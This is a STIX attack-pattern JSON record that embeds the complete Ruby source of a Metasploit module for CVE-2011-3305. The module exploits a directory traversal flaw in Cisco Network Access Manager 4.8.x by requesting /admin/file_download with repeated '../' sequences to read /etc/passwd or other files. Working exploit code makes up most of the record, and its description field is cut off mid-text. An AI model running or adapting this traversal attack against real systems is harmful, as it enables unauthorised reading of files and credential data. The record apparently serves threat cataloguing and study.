{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c168941b-0050-4696-9e28-311429bed560",
    "created": "2024-08-14T16:29:51.625932Z",
    "modified": "2024-08-14T16:29:51.625936Z",
    "name": "Cisco Network Access Manager Directory Traversal Vulnerability",
    "description": " This module tests whether a directory traversal vulnerablity is present in versions of Cisco Network Access Manager 4.8.x You may wish to change FILE (e.g. passwd or hosts), MAXDIRS and RPORT depending on your environment.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cisco_nac_manager_traversal.rb",
            "external_id": "cisco_nac_manager_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Cisco Network Access Manager Directory Traversal Vulnerability',\n      'Description'    => %q{\n        This module tests whether a directory traversal vulnerablity is present\n        in versions of Cisco Network Access Manager 4.8.x You may wish to change\n        FILE (e.g. passwd or hosts), MAXDIRS and RPORT depending on your environment.\n        },\n      'References'     =>\n        [\n          [ 'CVE', '2011-3305' ],\n          [ 'OSVDB', '76080']\n        ],\n      'Author'         => [ 'Nenad Stojanovski <nenad.stojanovski[at]gmail.com>' ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => {\n        'SSL'          => true\n      }\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd']),\n        OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7]),\n      ])\n  end\n\n  def run_host(ip)\n\n    traversal = '../../'\n    part1= '/admin/file_download?tag='\n    part2 = '&fileType=snapshot'\n\n    begin\n      print_status(\"Attempting to connect to #{rhost}:#{rport}\")\n      res = send_request_raw(\n        {\n          'method'  => 'GET',\n          'uri'     => '/admin',\n        }, 25)\n\n      if (res)\n        1.upto(datastore['MAXDIRS']) do |level|\n          try = traversal * level\n          traversalstring = part1 + try + datastore['FILE'] + part2\n          res = send_request_raw(\n            {\n              'method'  => 'GET',\n              'uri'     => traversalstring,\n            }, 25)\n          if (res and res.code == 200)\n            print_status(\"Request ##{level} may have succeeded on #{rhost}:#{rport}!\\r\\n Response: \\r\\n#{res.body}\")\n            break\n          elsif (res and res.code)\n            print_error(\"Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}\\r\\n\")\n          end\n        end\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Nenad Stojanovski <nenad.stojanovski[at]gmail.com> ]",
        ""
    ]
}